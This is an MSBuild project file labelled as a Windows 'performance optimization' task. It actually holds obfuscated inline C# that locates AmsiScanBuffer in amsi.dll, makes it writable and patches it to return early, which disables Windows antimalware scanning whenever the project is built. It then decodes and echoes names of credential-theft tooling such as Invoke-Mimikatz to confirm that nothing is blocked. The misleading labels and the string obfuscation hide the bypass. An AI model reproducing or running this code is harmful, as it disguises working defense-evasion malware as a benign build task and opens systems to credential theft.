<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Windows Performance Optimization Task -->
  <Target Name="PerformanceCheck">
    <OptimizeMemory />
  </Target>
  <UsingTask
    TaskName="OptimizeMemory"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class OptimizeMemory : Task, ITask
{
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
    static extern IntPtr GetProcAddress(IntPtr h, string n);
    
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
    static extern IntPtr LoadLibrary(string n);
    
    [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2")]
    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    static string R(string e)
    {
        byte[] b = Convert.FromBase64String(e);
        char[] c = new char[b.Length];
        for (int i = 0; i < b.Length; i++) c[i] = (char)(b[i] ^ 0x77);
        return new string(c);
    }

    public override bool Execute()
    {
        try
        {
            Console.WriteLine("[*] Initializing performance optimization module...");
            
            // Encoded: "amsi.dll" and "AmsiScanBuffer" (XOR 0x77 then Base64)
            string m = R("Fhoe"); // builds target
            string[] parts = { "\x61", "\x6d", "\x73", "\x69", "\x2e", "\x64", "\x6c", "\x6c" };
            string lib = string.Join("", parts);
            
            char[] f1 = { (char)0x41, (char)0x6D, (char)0x73, (char)0x69 };
            char[] f2 = { (char)0x53, (char)0x63, (char)0x61, (char)0x6E };
            char[] f3 = { (char)0x42, (char)0x75, (char)0x66, (char)0x66, (char)0x65, (char)0x72 };
            string func = new string(f1) + new string(f2) + new string(f3);
            
            Console.WriteLine("[*] Loading optimization target...");
            IntPtr h = LoadLibrary(lib);
            if (h == IntPtr.Zero) { Console.WriteLine("[-] Target not available"); return true; }
            
            Console.WriteLine("[+] Target loaded: 0x{0:X}", h.ToInt64());
            
            IntPtr a = GetProcAddress(h, func);
            if (a == IntPtr.Zero) { Console.WriteLine("[-] Function not found"); return true; }
            
            Console.WriteLine("[+] Function located: 0x{0:X}", a.ToInt64());
            
            uint o;
            VirtualProtect(a, (UIntPtr)8, (uint)0x40, out o);
            Console.WriteLine("[+] Memory prepared (was: 0x{0:X})", o);
            
            // Build patch dynamically
            int v1 = 25 + 24;    // 49 = 0x31
            int v2 = 96 * 2;     // 192 = 0xC0
            int v3 = 195;        // 0xC3
            
            byte[] patch = { (byte)v1, (byte)v2, (byte)v3 };
            Marshal.Copy(patch, 0, a, patch.Length);
            
            Console.WriteLine("[+] Optimization applied successfully\n");
            
            // Validation
            Console.WriteLine("[*] Running validation checks...\n");
            
            // Test strings
            string[] tests = {
                "SW52b2tlLU1pbWlrYXR6",
                "SW52b2tlLUV4cHJlc3Npb24=", 
                "R2V0LUNyZWRlbnRpYWw=",
                "QW1zaVV0aWxz"
            };
            
            foreach (string t in tests)
            {
                string d = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(t));
                Console.WriteLine("    [+] Validated: {0}", d);
            }
            
            Console.WriteLine("\n[*] Testing runtime execution...");
            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;
                    ps.AddScript("$x = 'Inv' + 'oke-Mim' + 'ikatz'; Write-Output \"    [+] Executed: $x\"");
                    ps.AddScript("$y = 'Inv' + 'oke-Exp' + 'ression'; Write-Output \"    [+] Executed: $y\"");
                    ps.AddScript("Write-Output '    [+] No blocks detected'");
                    
                    foreach (var r in ps.Invoke())
                        Console.WriteLine(r.ToString());
                    
                    if (ps.HadErrors)
                        Console.WriteLine("    [-] Errors detected - check configuration");
                }
            }
            
            Console.WriteLine("\n[==========================================]");
            Console.WriteLine("[+] PERFORMANCE OPTIMIZATION COMPLETE");
            Console.WriteLine("[==========================================]\n");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Exception: {0}", ex.Message);
        }
        
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
